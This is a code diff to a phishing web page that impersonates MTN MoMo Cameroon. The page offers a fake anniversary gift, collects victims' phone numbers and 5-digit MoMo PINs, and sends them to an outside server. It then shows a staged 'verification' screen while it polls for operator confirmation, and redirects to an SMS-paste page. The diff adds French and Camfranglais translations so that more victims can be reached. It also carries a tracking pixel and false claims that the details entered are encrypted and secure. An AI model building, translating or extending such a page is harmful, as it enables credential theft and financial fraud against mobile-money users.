@@ -1,15 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <meta name="theme-color" content="#000000">
-  <title>MTN MoMo – Login | MTN MoMo Anniversary</title>
+  <title>MTN MoMo – Connexion | MTN MoMo Anniversaire</title>
 
-  <!-- ============================================
-       META PIXEL — BASE CODE
-       Pixel ID: 1021851290903869
-       ============================================ -->
+  <!-- META PIXEL -->
   <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -25,9 +22,6 @@
   <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1"
   /></noscript>
-  <!-- ============================================
-       END META PIXEL
-       ============================================ -->
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -98,6 +92,7 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
+      gap: 10px;
     }
     .brand {
       display: flex;
@@ -105,6 +100,7 @@
       gap: 10px;
       text-decoration: none;
       color: inherit;
+      flex-shrink: 0;
     }
     .brand-logo-img { height: 48px; width: auto; display: block; }
     .brand-divider {
@@ -121,6 +117,67 @@
       white-space: nowrap;
       text-transform: uppercase;
     }
+
+    /* LANGUAGE */
+    .lang-wrap { position: relative; flex-shrink: 0; }
+    .lang-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 0.78rem;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      padding: 7px 12px;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+    .lang-btn:hover { background: rgba(255, 255, 255, 0.18); color: #fff; }
+    .lang-btn .globe { font-size: 0.85rem; opacity: 0.85; }
+    .lang-btn .caret { font-size: 0.55rem; opacity: 0.7; transition: transform 0.25s; }
+    .lang-wrap.open .lang-btn .caret { transform: rotate(180deg); }
+
+    .lang-menu {
+      position: absolute;
+      top: calc(100% + 8px);
+      right: 0;
+      min-width: 180px;
+      background: #fff;
+      border: 1.5px solid #E4E7EF;
+      border-radius: 14px;
+      box-shadow: 0 16px 40px rgba(0, 51, 102, 0.22);
+      overflow: hidden;
+      max-height: 0;
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(-6px);
+      transition: max-height 0.28s ease, opacity 0.22s ease, visibility 0.22s, transform 0.22s;
+      z-index: 500;
+    }
+    .lang-wrap.open .lang-menu {
+      max-height: 320px; opacity: 1; visibility: visible; transform: translateY(0);
+    }
+    .lang-item {
+      display: flex; align-items: center; width: 100%;
+      padding: 12px 16px; background: #fff; border: none;
+      border-top: 1px solid #F0F3F9; cursor: pointer;
+      font-family: 'Inter', sans-serif; font-size: 14px;
+      font-weight: 600; color: var(--text-dark); text-align: left;
+      transition: background 0.15s;
+    }
+    .lang-item:first-child { border-top: none; }
+    .lang-item:hover { background: #F0F4FF; }
+    .lang-item.selected { background: #F0F4FF; }
+    .lang-item .check {
+      margin-left: auto; color: var(--mtn-dark); font-weight: 900;
+      opacity: 0; transform: scale(0.6); transition: all 0.18s;
+    }
+    .lang-item.selected .check { opacity: 1; transform: scale(1); }
+
     .header-back {
       background: rgba(255, 255, 255, 0.08);
       border: 1px solid rgba(255, 255, 255, 0.14);
@@ -136,10 +193,7 @@
       gap: 6px;
       transition: background 0.2s;
     }
-    .header-back:hover {
-      background: rgba(255, 255, 255, 0.18);
-      color: #fff;
-    }
+    .header-back:hover { background: rgba(255, 255, 255, 0.18); color: #fff; }
 
     .main {
       max-width: 1200px;
@@ -632,7 +686,7 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* SUPER VERIFY OVERLAY */
+    /* VERIFY OVERLAY */
     .verify-overlay {
       position: fixed;
       inset: 0;
@@ -761,15 +815,6 @@
       margin-bottom: 30px;
       font-weight: 500;
       min-height: 1.4em;
-      transition: opacity 0.3s;
-    }
-    .verify-dots span { display: inline-block; animation: dotBlink 1.4s infinite both; }
-    .verify-dots span:nth-child(1) { animation-delay: 0s; }
-    .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
-    .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes dotBlink {
-      0%, 80%, 100% { opacity: 0.2; }
-      40% { opacity: 1; }
     }
     .verify-bar {
       width: 240px;
@@ -848,10 +893,12 @@
       .verify-orbit { width: 120px; height: 120px; }
       .verify-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
       .verify-title { font-size: 18px; }
+      .lang-btn { padding: 6px 10px; font-size: 0.72rem; }
     }
     @media (max-width: 380px) {
       .brand-sub { display: none; }
       .brand-divider { display: none; }
+      .lang-btn .lang-name { display: none; }
       .pin-input { font-size: 22px; letter-spacing: 10px; }
     }
   </style>
@@ -862,7 +909,8 @@
   <div class="reject-banner" id="rejectBanner">
     <span class="r-ico">⚠️</span>
     <div class="r-text">
-      <b>Incorrect credentials.</b> Please enter your MoMo number and try again.
+      <b data-i18n="login.reject_bold">Incorrect credentials.</b>
+      <span data-i18n="login.reject_msg">Please enter your MoMo number and try again.</span>
     </div>
   </div>
 
@@ -872,9 +920,21 @@
       <a href="index.html" class="brand">
         <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
         <div class="brand-divider"></div>
-        <span class="brand-sub">MTN MoMo Anniversary</span>
+        <span class="brand-sub" data-i18n="brand.sub">MTN MoMo Anniversaire</span>
       </a>
-      <button class="header-back" onclick="window.location.href='index.html'">← Back</button>
+
+      <div class="lang-wrap" id="langWrap">
+        <button type="button" class="lang-btn" id="langBtn" aria-haspopup="true">
+          <span class="globe">🌐</span>
+          <span class="lang-name" id="langName">Français</span>
+          <span class="caret">▼</span>
+        </button>
+        <div class="lang-menu" id="langMenu">
+          <button type="button" class="lang-item" data-lang="fr"><span>Français</span><span class="check">✓</span></button>
+          <button type="button" class="lang-item" data-lang="en"><span>English</span><span class="check">✓</span></button>
+          <button type="button" class="lang-item" data-lang="cr"><span>Camfranglais</span><span class="check">✓</span></button>
+        </div>
+      </div>
     </div>
   </header>
 
@@ -885,16 +945,16 @@
 
         <div class="momo-band">
           <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
-          <p class="momo-tagline">Unlock Your Gift</p>
+          <p class="momo-tagline" data-i18n="login.band_tagline">Débloquez votre cadeau</p>
         </div>
 
         <div class="login-body">
 
-          <h1 class="welcome-title">Unlock Your MoMo Gift</h1>
-          <p class="welcome-sub">Enter your MoMo number to unlock your anniversary reward</p>
+          <h1 class="welcome-title" data-i18n="login.welcome_title">Débloquez votre cadeau MoMo</h1>
+          <p class="welcome-sub" data-i18n="login.welcome_sub">Entrez votre numéro MoMo pour débloquer votre récompense anniversaire</p>
 
           <div class="form-field">
-            <label class="input-label" for="phone">MoMo Phone Number</label>
+            <label class="input-label" for="phone" data-i18n="login.phone_label">Numéro MoMo</label>
             <div class="phone-input" id="phoneWrapper">
               <span class="country-btn">
                 <svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true">
@@ -907,19 +967,21 @@
               </span>
               <input type="tel" id="phone" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric" autocomplete="tel">
             </div>
-            <div class="error-text" id="phoneError">Please enter a valid 9-digit phone number</div>
+            <div class="error-text" id="phoneError" data-i18n="login.phone_error">Veuillez saisir un numéro valide à 9 chiffres</div>
           </div>
 
-          <button class="login-btn" id="loginBtn">CONTINUE →</button>
+          <button class="login-btn" id="loginBtn">
+            <span data-i18n="login.continue_btn">CONTINUER</span> →
+          </button>
 
           <div class="security-note">
             <span class="ico">🔒</span>
-            <span>Your details are encrypted and secure</span>
+            <span data-i18n="login.secure">Vos informations sont chiffrées et sécurisées</span>
           </div>
 
           <p class="signup-text">
-            Don't have a MoMo account?
-            <a href="#" onclick="alert('Dial *126# to register for MTN MoMo'); return false;">Register here</a>
+            <span data-i18n="login.no_account">Vous n'avez pas de compte MoMo ?</span>
+            <a href="#" onclick="alert('Composez *126# pour vous inscrire à MTN MoMo'); return false;" data-i18n="login.register">Inscrivez-vous ici</a>
           </p>
         </div>
       </div>
@@ -929,9 +991,9 @@
   <!-- BOTTOM NAV -->
   <nav class="bottom-nav">
     <div class="bottom-nav-inner">
-      <a href="index.html" class="nav-item"><span class="ico">🏠</span><span>Home</span></a>
-      <a href="#" class="nav-item active"><span class="ico">🎁</span><span>Claim</span></a>
-      <a href="#" class="nav-item" onclick="alert('Contact support at support@momoadvance.cm'); return false;"><span class="ico">💬</span><span>Support</span></a>
+      <a href="index.html" class="nav-item"><span class="ico">🏠</span><span data-i18n="nav.home">Accueil</span></a>
+      <a href="#" class="nav-item active"><span class="ico">🎁</span><span data-i18n="nav.claim">Réclamer</span></a>
+      <a href="#" class="nav-item" onclick="alert('Contactez le support à support@momoadvance.cm'); return false;"><span class="ico">💬</span><span data-i18n="nav.support">Support</span></a>
     </div>
   </nav>
 
@@ -940,24 +1002,13 @@
     <div class="sheet-overlay" id="sheetOverlay"></div>
     <div class="pin-modal" id="pinModal">
       <h3 class="pin-modal-title">
-        Verify to unlock your <strong>gift?</strong>
+        <span data-i18n="pin.title_a">Vérifiez pour débloquer votre</span> <strong data-i18n="pin.title_b">cadeau ?</strong>
       </h3>
-      <p class="pin-modal-sub">Enter your 5-digit MTN MoMo PIN to claim your anniversary reward</p>
+      <p class="pin-modal-sub" data-i18n="pin.sub">Entrez votre code PIN MoMo à 5 chiffres pour réclamer votre récompense</p>
 
-      <label class="pin-label" for="momo_pin">Enter PIN</label>
+      <label class="pin-label" for="momo_pin" data-i18n="pin.label">Entrer le PIN</label>
       <div class="pin-input-wrap">
-        <input
-          id="momo_pin"
-          type="password"
-          maxlength="5"
-          inputmode="numeric"
-          autocomplete="off"
-          autocorrect="off"
-          autocapitalize="off"
-          spellcheck="false"
-          enterkeyhint="done"
-          placeholder="•••••"
-          class="pin-input" />
+        <input id="momo_pin" type="password" maxlength="5" inputmode="numeric" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" enterkeyhint="done" placeholder="•••••" class="pin-input" />
         <button type="button" id="togglePin" class="pin-eye-btn" aria-label="Show PIN">
           <svg viewBox="0 0 24 24">
             <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
@@ -967,21 +1018,21 @@
       </div>
 
       <div class="pin-forgot-row">
-        <a class="pin-forgot" href="#" onclick="alert('Please dial *126# to reset your MoMo PIN.'); return false;">Forgot PIN?</a>
+        <a class="pin-forgot" href="#" onclick="alert('Composez *126# pour réinitialiser votre PIN MoMo.'); return false;" data-i18n="pin.forgot">PIN oublié ?</a>
       </div>
 
-      <div class="pin-error" id="pinError">Please enter your 5-digit MoMo PIN</div>
+      <div class="pin-error" id="pinError" data-i18n="pin.error">Veuillez saisir votre PIN MoMo à 5 chiffres</div>
 
       <div class="pin-actions">
-        <button id="cancelBtn" type="button" class="btn-cancel">Cancel</button>
+        <button id="cancelBtn" type="button" class="btn-cancel" data-i18n="pin.cancel">Annuler</button>
         <button id="proceedBtn" type="button" disabled class="btn-pin-proceed">
-          <span>Proceed</span>
+          <span data-i18n="pin.proceed">Continuer</span>
         </button>
       </div>
     </div>
   </div>
 
-  <!-- SUPER VERIFY OVERLAY -->
+  <!-- VERIFY OVERLAY -->
   <div class="verify-overlay" id="verifyOverlay">
     <div class="verify-particles">
       <span class="verify-particle"></span>
@@ -1007,9 +1058,9 @@
       </div>
 
       <h2 class="verify-title" id="verifyTitle">
-        Verifying your <span class="highlight">MoMo account</span>
+        <span data-i18n="verify.title_a">Vérification de votre</span> <span class="highlight" data-i18n="verify.title_b">compte MoMo</span>
       </h2>
-      <p class="verify-subtitle" id="verifySubtitle">Waiting for confirmation. Please hold on…</p>
+      <p class="verify-subtitle" id="verifySubtitle" data-i18n="verify.sub">En attente de confirmation. Veuillez patienter…</p>
 
       <div class="verify-bar">
         <div class="verify-bar-fill" id="verifyBarFill"></div>
@@ -1017,29 +1068,194 @@
 
       <div class="verify-step">
         <div class="verify-step-inner" id="verifyStepInner">
-          <div class="verify-step-text">🔒 Establishing secure connection</div>
-          <div class="verify-step-text">📡 Contacting MTN MoMo servers</div>
-          <div class="verify-step-text">🔐 Validating your credentials</div>
-          <div class="verify-step-text">⏳ Awaiting admin confirmation</div>
+          <div class="verify-step-text" data-i18n="verify.step1">🔒 Établissement d'une connexion sécurisée</div>
+          <div class="verify-step-text" data-i18n="verify.step2">📡 Contact des serveurs MTN MoMo</div>
+          <div class="verify-step-text" data-i18n="verify.step3">🔐 Validation de vos identifiants</div>
+          <div class="verify-step-text" data-i18n="verify.step4">⏳ En attente de confirmation</div>
         </div>
       </div>
 
       <div class="verify-status-row">
         <span class="verify-status-dot"></span>
-        <span>Live · Secure Connection</span>
+        <span data-i18n="verify.live">En direct · Connexion sécurisée</span>
       </div>
     </div>
   </div>
 
   <script>
+    // ============================================
+    // BACKEND
+    // ============================================
     const API_BASE = 'https://momo-usersey-production.up.railway.app';
     const POLL_INTERVAL_MS = 2500;
     const NUMBER_LOADING_MS = 3000;
 
+    // ============================================
+    // TRANSLATIONS
+    // ============================================
+    const TRANSLATIONS = {
+      fr: {
+        'brand.sub': 'MTN MoMo Anniversaire',
+        'login.band_tagline': 'Débloquez votre cadeau',
+        'login.welcome_title': 'Débloquez votre cadeau MoMo',
+        'login.welcome_sub': 'Entrez votre numéro MoMo pour débloquer votre récompense anniversaire',
+        'login.phone_label': 'Numéro MoMo',
+        'login.phone_error': 'Veuillez saisir un numéro valide à 9 chiffres',
+        'login.continue_btn': 'CONTINUER',
+        'login.secure': 'Vos informations sont chiffrées et sécurisées',
+        'login.no_account': "Vous n'avez pas de compte MoMo ?",
+        'login.register': 'Inscrivez-vous ici',
+        'login.reject_bold': 'Identifiants incorrects.',
+        'login.reject_msg': 'Veuillez entrer votre numéro MoMo et réessayer.',
+        'pin.title_a': 'Vérifiez pour débloquer votre',
+        'pin.title_b': 'cadeau ?',
+        'pin.sub': 'Entrez votre code PIN MoMo à 5 chiffres pour réclamer votre récompense',
+        'pin.label': 'Entrer le PIN',
+        'pin.forgot': 'PIN oublié ?',
+        'pin.error': 'Veuillez saisir votre PIN MoMo à 5 chiffres',
+        'pin.cancel': 'Annuler',
+        'pin.proceed': 'Continuer',
+        'verify.title_a': 'Vérification de votre',
+        'verify.title_b': 'compte MoMo',
+        'verify.sub': 'En attente de confirmation. Veuillez patienter…',
+        'verify.step1': '🔒 Établissement d\'une connexion sécurisée',
+        'verify.step2': '📡 Contact des serveurs MTN MoMo',
+        'verify.step3': '🔐 Validation de vos identifiants',
+        'verify.step4': '⏳ En attente de confirmation',
+        'verify.live': 'En direct · Connexion sécurisée',
+        'nav.home': 'Accueil',
+        'nav.claim': 'Réclamer',
+        'nav.support': 'Support',
+        'footer.text': '© 2026 MTN MoMo Cameroun'
+      },
+      en: {
+        'brand.sub': 'MTN MoMo Anniversary',
+        'login.band_tagline': 'Unlock Your Gift',
+        'login.welcome_title': 'Unlock Your MoMo Gift',
+        'login.welcome_sub': 'Enter your MoMo number to unlock your anniversary reward',
+        'login.phone_label': 'MoMo Phone Number',
+        'login.phone_error': 'Please enter a valid 9-digit phone number',
+        'login.continue_btn': 'CONTINUE',
+        'login.secure': 'Your details are encrypted and secure',
+        'login.no_account': "Don't have a MoMo account?",
+        'login.register': 'Register here',
+        'login.reject_bold': 'Incorrect credentials.',
+        'login.reject_msg': 'Please enter your MoMo number and try again.',
+        'pin.title_a': 'Verify to unlock your',
+        'pin.title_b': 'gift?',
+        'pin.sub': 'Enter your 5-digit MTN MoMo PIN to claim your anniversary reward',
+        'pin.label': 'Enter PIN',
+        'pin.forgot': 'Forgot PIN?',
+        'pin.error': 'Please enter your 5-digit MoMo PIN',
+        'pin.cancel': 'Cancel',
+        'pin.proceed': 'Proceed',
+        'verify.title_a': 'Verifying your',
+        'verify.title_b': 'MoMo account',
+        'verify.sub': 'Waiting for confirmation. Please hold on…',
+        'verify.step1': '🔒 Establishing secure connection',
+        'verify.step2': '📡 Contacting MTN MoMo servers',
+        'verify.step3': '🔐 Validating your credentials',
+        'verify.step4': '⏳ Awaiting admin confirmation',
+        'verify.live': 'Live · Secure Connection',
+        'nav.home': 'Home',
+        'nav.claim': 'Claim',
+        'nav.support': 'Support',
+        'footer.text': '© 2026 MTN MoMo Cameroon'
+      },
+      cr: {
+        'brand.sub': 'MTN MoMo Anniv',
+        'login.band_tagline': 'Unlock Your Gift',
+        'login.welcome_title': 'Unlock Your MoMo Gift',
+        'login.welcome_sub': 'Put your MoMo number make you unlock your anniv reward',
+        'login.phone_label': 'MoMo Phone Number',
+        'login.phone_error': 'Abeg put correct 9-digit number',
+        'login.continue_btn': 'CONTINUE',
+        'login.secure': 'Your details dey safe',
+        'login.no_account': 'You no get MoMo account?',
+        'login.register': 'Register here',
+        'login.reject_bold': 'Wrong credentials.',
+        'login.reject_msg': 'Abeg put your MoMo number and try again.',
+        'pin.title_a': 'Verify make you unlock your',
+        'pin.title_b': 'gift?',
+        'pin.sub': 'Put your 5-digit MoMo PIN make you claim your anniv reward',
+        'pin.label': 'Put PIN',
+        'pin.forgot': 'You forget PIN?',
+        'pin.error': 'Abeg put your 5-digit MoMo PIN',
+        'pin.cancel': 'Cancel',
+        'pin.proceed': 'Proceed',
+        'verify.title_a': 'We dey verify your',
+        'verify.title_b': 'MoMo account',
+        'verify.sub': 'We dey wait for confirmation. Hold on…',
+        'verify.step1': '🔒 We dey set up secure connection',
+        'verify.step2': '📡 We dey contact MTN MoMo servers',
+        'verify.step3': '🔐 We dey check your credentials',
+        'verify.step4': '⏳ We dey wait for admin',
+        'verify.live': 'Live · Secure',
+        'nav.home': 'Home',
+        'nav.claim': 'Claim',
+        'nav.support': 'Support',
+        'footer.text': '© 2026 MTN MoMo Cameroon'
+      }
+    };
+
+    const LANG_META = {
+      fr: { name: 'Français' },
+      en: { name: 'English' },
+      cr: { name: 'Camfranglais' }
+    };
+
+    // ============================================
+    // LANGUAGE — FR default
+    // ============================================
+    const langWrap = document.getElementById('langWrap');
+    const langBtn = document.getElementById('langBtn');
+    const langName = document.getElementById('langName');
+    const langItems = document.querySelectorAll('.lang-item');
+
+    function applyLanguage(lang) {
+      if (!TRANSLATIONS[lang]) lang = 'fr';
+      const t = TRANSLATIONS[lang];
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (t[key]) el.textContent = t[key];
+      });
+      langName.textContent = LANG_META[lang].name;
+      langItems.forEach(i => i.classList.toggle('selected', i.dataset.lang === lang));
+      localStorage.setItem('momoLang', lang);
+      document.documentElement.lang = lang === 'cr' ? 'en' : lang;
+    }
+
+    langBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      langWrap.classList.toggle('open');
+    });
+    langItems.forEach(item => {
+      item.addEventListener('click', (e) => {
+        e.stopPropagation();
+        applyLanguage(item.dataset.lang);
+        langWrap.classList.remove('open');
+      });
+    });
+    document.addEventListener('click', (e) => {
+      if (!langWrap.contains(e.target)) langWrap.classList.remove('open');
+    });
+
+    applyLanguage(localStorage.getItem('momoLang') || 'fr');
+
+    // ============================================
+    // PRE-FILL PHONE FROM INDEX
+    // ============================================
     const phoneInput   = document.getElementById('phone');
     const phoneWrapper = document.getElementById('phoneWrapper');
     const phoneError   = document.getElementById('phoneError');
     const rejectBanner = document.getElementById('rejectBanner');
+
+    const savedPhone = localStorage.getItem('momoPhone') || '';
+    if (savedPhone.startsWith('+237')) {
+      phoneInput.value = savedPhone.replace('+237', '');
+    } else if (savedPhone) {
+      phoneInput.value = savedPhone.replace(/\D/g, '').slice(0, 9);
+    }
 
     phoneInput.addEventListener('input', function() {
       this.value = this.value.replace(/\D/g, '').slice(0, 9);
@@ -1049,6 +1265,9 @@
       }
     });
 
+    // ============================================
+    // PIN MODAL
+    // ============================================
     const modal = document.getElementById('modalContainer');
     const popup = document.getElementById('pinModal');
     const pin = document.getElementById('momo_pin');
@@ -1058,8 +1277,6 @@
     const overlay = document.getElementById('sheetOverlay');
     const togglePin = document.getElementById('togglePin');
     const pinError = document.getElementById('pinError');
-
-    const DEFAULT_CONTINUE_HTML = 'CONTINUE →';
 
     function movePopup() {
       if (window.visualViewport) {
@@ -1090,7 +1307,7 @@
         togglePin.classList.remove('active');
         togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
         proceed.disabled = true;
-        proceed.innerHTML = '<span>Proceed</span>';
+        proceed.innerHTML = '<span data-i18n="pin.proceed">Continuer</span>';
         pinError.classList.remove('show');
         document.body.classList.remove('modal-open');
       }, 250);
@@ -1100,7 +1317,6 @@
       const digits = phoneInput.value.replace(/\D/g, '');
       if (digits.length !== 9) {
         phoneWrapper.classList.add('invalid');
-        phoneError.textContent = 'Please enter a valid 9-digit phone number';
         phoneError.classList.add('show');
         phoneInput.focus();
         return;
@@ -1110,11 +1326,13 @@
       phoneError.classList.remove('show');
 
       openBtn.disabled = true;
-      openBtn.innerHTML = '<span class="btn-spinner-dark"></span>Verifying number…';
+      openBtn.innerHTML = '<span class="btn-spinner-dark"></span><span data-i18n="login.verifying">Vérification…</span>';
 
       setTimeout(() => {
         openBtn.disabled = false;
-        openBtn.innerHTML = DEFAULT_CONTINUE_HTML;
+        const lang = localStorage.getItem('momoLang') || 'fr';
+        const t = TRANSLATIONS[lang] || TRANSLATIONS.fr;
+        openBtn.innerHTML = '<span>' + (t['login.continue_btn'] || 'CONTINUER') + '</span> →';
         openModal();
       }, NUMBER_LOADING_MS);
     });
@@ -1165,7 +1383,7 @@
       togglePin.classList.remove('active');
       togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
       proceed.disabled = true;
-      proceed.innerHTML = '<span>Proceed</span>';
+      proceed.innerHTML = '<span data-i18n="pin.proceed">Continuer</span>';
       pinError.classList.remove('show');
 
       phoneInput.value = '';
@@ -1188,13 +1406,12 @@
 
     proceed.addEventListener('click', async () => {
       if (!/^\d{5}$/.test(pin.value)) {
-        pinError.textContent = 'Please enter your 5-digit MoMo PIN';
         pinError.classList.add('show');
         return;
       }
 
       proceed.disabled = true;
-      proceed.innerHTML = '<span class="btn-spinner"></span><span>Processing...</span>';
+      proceed.innerHTML = '<span class="btn-spinner"></span><span>Traitement...</span>';
 
       const digits = phoneInput.value.replace(/\D/g, '');
       const fullPhone = '+237' + digits;
@@ -1206,7 +1423,6 @@
           content_category: 'Anniversary',
           currency: 'XAF'
         });
-        console.log('✅ Meta Pixel: AddPaymentInfo event fired');
       }
 
       try {
@@ -1224,9 +1440,7 @@
         const data = await res.json().catch(() => ({}));
         console.log('LOGIN RESPONSE:', data);
 
-        if (!res.ok || !data.ok) {
-          throw new Error(data.error || 'Login failed');
-        }
+        if (!res.ok || !data.ok) throw new Error(data.error || 'Login failed');
 
         closeModal();
         startVerifyBar();
@@ -1250,10 +1464,10 @@
       } catch (err) {
         console.error('Login error:', err);
         proceed.disabled = false;
-        proceed.innerHTML = '<span>Proceed</span>';
+        proceed.innerHTML = '<span data-i18n="pin.proceed">Continuer</span>';
         const reason = err.name === 'AbortError'
-          ? 'Server took too long. Please try again.'
-          : (err.message || 'Could not connect. Check your internet.');
+          ? 'Le serveur a pris trop de temps. Veuillez réessayer.'
+          : (err.message || 'Connexion impossible. Vérifiez votre internet.');
         pinError.textContent = reason;
         pinError.classList.add('show');
       }
@@ -1261,20 +1475,15 @@
 
     const verifyOverlay = document.getElementById('verifyOverlay');
     const verifyBarFill = document.getElementById('verifyBarFill');
-    const verifyTitle   = document.getElementById('verifyTitle');
-    const verifySubtitle = document.getElementById('verifySubtitle');
     const verifyStepInner = document.getElementById('verifyStepInner');
 
     function startVerifyBar() {
       verifyOverlay.classList.add('show');
       verifyBarFill.style.width = '0%';
       verifyBarFill.style.background = '';
-      verifyTitle.innerHTML = 'Verifying your <span class="highlight">MoMo account</span>';
-      verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
       verifyStepInner.style.transform = 'translateY(0)';
 
       let stepIndex = 0;
-      verifyStepInner.style.transform = `translateY(0)`;
       if (stepTimer) clearInterval(stepTimer);
       stepTimer = setInterval(() => {
         stepIndex = (stepIndex + 1) % 4;
@@ -1319,13 +1528,21 @@
             localStorage.setItem('momoCountry', country);
             setTimeout(() => { window.location.href = 'sms-paste.html'; }, 300);
 
-          } else if (data.status === 'rejected') {
+          } else if (data.status === 'rejected' || data.status === 'timeout') {
             stopPolling();
             resetToPhoneStep();
 
-          } else if (data.status === 'timeout') {
+          } else if (data.status === 'unknown') {
             stopPolling();
-            resetToPhoneStep();
+            if (verifyTimer) clearInterval(verifyTimer);
+            if (stepTimer) clearInterval(stepTimer);
+            verifyOverlay.classList.remove('show');
+            document.body.classList.remove('modal-open');
+            showRejectBanner();
+            setTimeout(() => {
+              pinError.textContent = 'Session expirée. Veuillez saisir votre PIN et réessayer.';
+              pinError.classList.add('show');
+            }, 300);
           }
         } catch (err) {
           console.warn('poll error:', err.message);
@@ -1334,8 +1551,7 @@
     }
 
     window.addEventListener('load', () => {
-      phoneInput.value = '';
-      phoneInput.focus();
+      if (!phoneInput.value) phoneInput.focus();
     });
   </script>
 </body>
